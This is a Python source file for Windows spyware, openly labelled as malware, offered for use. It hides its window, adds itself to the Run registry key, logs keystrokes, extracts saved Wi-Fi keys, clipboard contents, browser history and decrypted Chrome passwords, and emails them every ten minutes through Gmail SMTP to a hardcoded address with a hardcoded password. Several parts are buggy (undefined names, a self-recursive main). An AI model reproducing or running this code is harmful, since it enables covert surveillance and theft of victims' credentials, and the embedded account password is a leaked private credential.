
from email.mime.multipart import MIMEMultipart    
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.application import MIMEApplication
from email import encoders                         
import smtplib 
import subprocess
import json
from pynput.keyboard import Key, Listener         
import logging
import time
from threading import Thread , Timer                              
import re
import win32crypt
import socket
import platform
import sqlite3
import win32api
import win32clipboard
import os
from os import getenv
import sys
from winreg import *
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import base64
import pathlib

addr = "said10abderrahmen@gmail.com" #put your email adress here  
passwd = r"byqebosqgwllvcsh" # email password here 
dir_path = 'C:\\Users\\Public\\Logs\\' #where the malware stores data
delay = 600 # send an email every 600 seconds
key_log_path = dir_path + "keylog.txt"
wifi_path = dir_path + "wifi.txt"
clip_path = dir_path + "clip.txt"
infos_path = dir_path + "infos.txt"
pass_path = dir_path + "pass.txt"
history_path = dir_path + "history.txt"
files = ["keylog.txt","wifi.txt","clip.txt","infos.txt","pass.txt","history.txt"]

def addStartup():  # make the file run everytime you open windows  
    fp = os.path.dirname(os.path.realpath(__file__))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'spy', 0, REG_SZ,
               new_file_path)


def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)


def send_email(dir_path,files,addr,passwd):
    
    
    msg = MIMEMultipart()
    msg['From'] = addr 
    msg['To'] = taddr 
    msg['Subject'] = "Output of SPY"
    body = "here's your victim"
    msg.attach(MIMEText(body, 'plain'))
    for f in files:  
        file_path = os.path.join(dir_path, f)
        attachment = MIMEApplication(open(file_path, "rb").read(), _subtype="txt")
        attachment.add_header('Content-Disposition','attachment', filename=f)
        encoders.encode_base64(attachment)
        msg.attach(attachment)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(addr,passwd )
    text = msg.as_string()
    s.sendmail(addr, addr, text)
    s.quit()
    


def report(delay):
    send_email(dir_path,files,addr,passwd )
    timer = Timer(delay, report)
    timer.start()

def key_log(key_log_path) :

    logging.basicConfig(filename=(key_log_path), \
            level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        report()
        listener.join()
    
def wifi_list(wifi_path) :
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.call('taskkill /F /IM exename.exe', startupinfo=si)
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True, startupinfo=si).stdout.decode()
    profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
    wifi_list = []

    if len(profile_names) != 0:
        for name in profile_names:

            wifi_profile = {}

            profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True ,startupinfo=si).stdout.decode()

            if re.search("Security key     : Absent", profile_info):
                continue
            else:
                wifi_profile["ssid"] = name
                profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True,startupinfo=si).stdout.decode()
                password = re.search("Key Content            : (.*)\r", profile_info_pass)
                if password == None:
                    wifi_profile["password"] = None
                else:
                    wifi_profile["password"] = password[1]
                wifi_list.append(wifi_profile) 
    with open(wifi_path,"w") as f:
        for x in wifi_list:
            f.write(json.dumps(x))
        f.close()
    #threading.Timer(20.0, wifi_list(wifi_path).start())

def copy_clipboard(clip_path):
    with open(clip_path, "w") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could be not be copied")
    
    

def machine_infos(infos_path):
    with open(infos_path, "w") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("PUBLIC IP : " + public_ip)

        except Exception:
            f.write("no public IP something went wrong \n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("PRIVATE IP: " + IPAddr + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
    

def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]  
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key

def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
     try:
         iv = buff[3:15]
         payload = buff[15:]
         cipher = generate_cipher(master_key, iv)
         decrypted_pass = decrypt_payload(cipher, payload)
         decrypted_pass = decrypted_pass[:-16].decode()  
         return decrypted_pass
     except Exception as e:

         return "Chrome < 80"
 
def dump_pass(pass_path):
    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") 
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        n = open(pass_path,"w")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                m = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                #print(m)
                n.write(m)
        n.close()
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass
    

def dump_history(history_path):
    history_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\history'
    shutil.copy2(history_db, "historyvault.db")
    con = sqlite3.connect("historyvault.db")
    cur = con.cursor()
    output_file = open(history_path, 'w')
    cur.execute('SELECT url, title, last_visit_time FROM urls')
    for row in cur.fetchall():
        output_file.write("Website: %s \n\t Title: %s \n\t Last Visited: %s \n\n" % (
        u''.join(row[0]).encode('utf-8').strip(), u''.join(row[1]).encode('utf-8').strip(),
        u''.join(str(row[2])).encode('utf-8').strip()))
    output_file.close()
    try:
        os.remove("historyvault.db")
    except Exception as e:
        pass
    




def main():
    Hide()
    pathlib.Path('C:/Users/Public/Logs').mkdir(parents=True, exist_ok=True)
    
    addStartup()
    Thread(target = dump_pass(pass_path)).start()
    Thread(target = wifi_list(wifi_path)).start()
    Thread(target = copy_clipboard(clip_path)).start()
    Thread(target = machine_infos(infos_path)).start()
    Thread(target = dump_history(history_path)).start()
    Thread(target = key_log(key_log_path)).start()

    
    main()

    
    
if __name__ == '__main__':
    try:
        main()


    except Exception as e:
        logging.basicConfig(level=logging.DEBUG, filename='C:/Users/Public/Logs/error_log.txt')
        logging.exception('* Error Ocurred: {} *'.format(e))
        pass
